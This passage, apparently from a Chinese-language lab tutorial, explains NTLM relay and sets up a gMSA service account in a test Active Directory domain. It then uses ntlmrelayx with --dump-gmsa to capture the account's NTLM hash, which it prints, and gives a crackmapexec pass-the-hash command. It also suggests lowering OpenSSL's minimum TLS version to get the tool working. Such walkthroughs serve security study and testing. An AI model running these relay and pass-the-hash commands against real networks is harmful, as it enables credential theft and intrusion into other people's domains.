0x02 NTLM Relay

NTLM Relay 攻击属于一种中间人攻击。攻击者首先转发客户端所发送的协商消息到服务端，并获取服务端的响应内容，幵获取服务端的响应。由于服务端并不知道客户端的真实身份，所以会发送 challenge 字段。当攻击者收到 challenge 字段后，将 challenge 发送回客户端。客户端计算出 response，将 response 发送给攻击者，攻击者再次将response 发送到服务端。NTLM Relay 支持 SMB, HTTP(S), LDAP, IMAP, SMTP, POP3 and MSSQL 等协议。




0x03 创建 gMSA

Windows 2008 微软推出了托管服务账户 MSA，本质是继承了计算机账户的特性，每次由计算机自动更换密码。但是托管服务账户不支持多台主机和计划任务。因此 Windows 2012 微软推出了组托管服务账户 gMSA，用于支持多台主机和计划任务。组托管服务账户 gMSA 密码是由域控制器 KDS 管理，由KdsRootKey IDr，时间戳和 gMSA SID 运算生成的随机密码。首先创建安全组，设置组名为gMSA -Test。


添加成员

command :

Add-KdsRootKey -EffectiveTime (Get-Date).AddHours(-10)

command :

New-ADServiceAccount  -Name gMSAtest -DNSHostName gMSAtest.rootkit.org -PrincipalsAllowedToRetrieveManagedPassword gMSA-Test -SamAccountName gMSAtest -ServicePrincipalNames http/gMSAtest.rootkit.org/rootkit.org,http/gMSAtest.rootkit.org/rootkit,http/gMSAtest/rootkit.org,http/gMSAtest/rootkit

Name

对应于Active Directory 中对象的 Name 属性

SamAccountName

要分配到服务帐户的用户名

DisplayName

在管理工具中显示的友好名称

DNSHostName

对应于服务的 DNS FQDN

PrincipalsAllowedToRetrievePassword

在AD中可以检索帐户密码的对象列表

ServicePrincipalNames

该服务的服务主体名称


command :

Set-ADServiceAccount -Identity 'gMSAtest' -PrincipalsAllowedToRetrieveManagedPassword sqladmin

查看 msDS-ManagedPassword 值

command :

Get-ADServiceAccount -Identity 'gMSAtest' -Properties 'msDS-ManagedPassword'

command :

Install-WindowsFeature RSATInstall-AdServiceAccount gMSAtest Test-AdServiceAccount gMSAtest


0x04 获取 gMSA Hash

command :

python ntlmrelayx.py --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs -debug -t ldaps://192.168.3.208

访问地址 http://192.168.3.216/ 并输入用户名口令信息

通过观察 Kali 控制台输出可以看到组托管账户 gMSAtest$ 的 Hash 值

gMSAtest$:::93eef551e34c05acbb00ef22363d62bc

command :

crackmapexec 192.168.3.208 -u gMSAtest$ -H 00000000000000000000000000000000:93eef551e34c05acbb00ef22363d62bc

注：在测试过程中遇到了一些问题，ntlmrelayx 程序在使用 ldaps 协议时会报错，通过 debug 信息可以看到 LDAPSocketOpenError ssl 问题。

注：kali 版本为 "2020.1" 和 openssl 版本为 "1.1.1d"  在访问 ldap 636 端口服务时会返回异常信息。修改/etc/ssl/openssl.cnf 配置文件中 system_default_sect 字段，将 MinProtocol = TLSv1.2 改为为 MinProtocol = TLSv1.0 即可。
